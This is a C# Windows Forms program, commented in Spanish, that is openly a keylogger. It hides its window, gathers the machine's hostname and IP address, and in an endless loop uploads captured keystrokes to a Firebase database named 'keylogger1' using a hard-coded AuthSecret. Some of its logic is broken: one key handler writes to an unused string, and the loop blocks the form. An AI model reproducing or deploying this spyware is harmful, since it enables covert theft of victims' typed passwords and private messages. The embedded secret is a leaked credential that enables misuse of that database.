
using System;

using System.Net;

using System.Windows.Forms;
//conexion con firebase
using FireSharp.Config;
//permite gestionar los datos de firebase
using FireSharp.Interfaces;

namespace WinFormsApp2
{
    
    public partial class Form1 : Form
    {
       
        public Form1()
        {
           
            InitializeComponent();
        }
        //declaramos la funcion variable guarda laS credenciales de firebase
        IFirebaseConfig config = new FirebaseConfig()
        {
            //es la clave token para firebase
            AuthSecret = "bNHMNnguXzKnzYf3hKJ9uvcq7IuTwkzM2rvcstDz",
          
            BasePath= "https://keylogger1-8eaa7-default-rtdb.firebaseio.com/"
        };
        
        IFirebaseClient client;

        

        private void Form1_Load(object sender, EventArgs e)
        {
            
            while (true)
            {
                //se ejecute en segundo plano
                this.Hide();
                
                string momento = DateTime.Now.ToString("dd MM yyyy") + "-" + DateTime.Now.ToString("HH:mm:ss");
               

                string strHostName = string.Empty;
                //obtenemos y guardamos el nombre de la pc
                strHostName = Dns.GetHostName();


                // ip del equipo
                IPAddress[] hostIPs = Dns.GetHostAddresses(strHostName);
             
                string ip = "", ipf = "";
              
                for (int i = 0; i < hostIPs.Length; i++)
                {
                    
                    ip = "IP:" + hostIPs[i].ToString();
                }

               
                Klogger dat = new Klogger();

                //enviamos las credenciales a firebase
                client = new FireSharp.FirebaseClient(config);

               
                for (int i = 0; i < ip.Length; i++)
                {
                    
                    if (ip[i] == '.')
                    {
                       
                        ipf = ipf + "-";
                    }
                    //si no existe un (.) entonces gurdamos la ip
                    else
                    {
                        //guardamos la ip
                        ipf = ipf + ip[i];
                    }
                }
                
                string name = ipf + "-" + strHostName;
                //enviamos y guardamos los datos
                var seter = client.Set("keylogger/" + name + "/" + momento + "/", dat.Captura);
            }

        }

        string prueba;
        public void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            prueba += e.KeyData;
        }

        private void Form1_KeyPress(object sender, KeyPressEventArgs e)
        {

        }
    }
}
